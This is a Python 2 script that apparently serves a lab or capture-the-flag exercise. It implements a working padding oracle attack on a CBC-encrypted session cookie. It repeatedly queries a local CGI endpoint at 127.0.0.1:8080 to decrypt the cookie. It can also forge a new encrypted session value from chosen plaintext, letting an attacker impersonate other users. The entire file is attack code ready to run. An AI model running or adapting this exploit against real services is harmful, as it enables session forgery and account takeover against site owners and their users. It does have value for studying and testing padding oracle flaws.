from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests
 
class PadBuster(PaddingOracle):
    def __init__(self, valid_cookie, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.wait = kwargs.get('wait', 2.0)
        self.valid_cookie = valid_cookie
 
    def oracle(self, data, **kwargs):
        v = b64encode(self.valid_cookie+data)
 
        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',
                cookies=dict(session=v), stream=False, timeout=5, verify=False)
 
        if 'username' in response.content:
            logging.debug('No padding exception raised on %r', v)
            return
 
        raise BadPaddingException
 
if __name__ == '__main__':
    import logging
    import sys
 
    if not sys.argv[2:]:
        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'
        sys.exit(1)
 
    logging.basicConfig(level=logging.WARN)
    mode = sys.argv[1]
    session = b64decode(sys.argv[2])
    padbuster = PadBuster(session)
 
    if mode == "decrypt":
        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])
        print('Decrypted session:\n%r' % cookie)
    elif mode == "encrypt":
        key = session[0:16]
        plaintext = sys.argv[3]
 
        s = padbuster.encrypt(plaintext, block_size=16)
 
        data = b64encode(key+s[0:len(s)-16])
        print('Encrypted session:\n%s' % data)
    else:
        print "invalid mode"
        sys.exit(1)
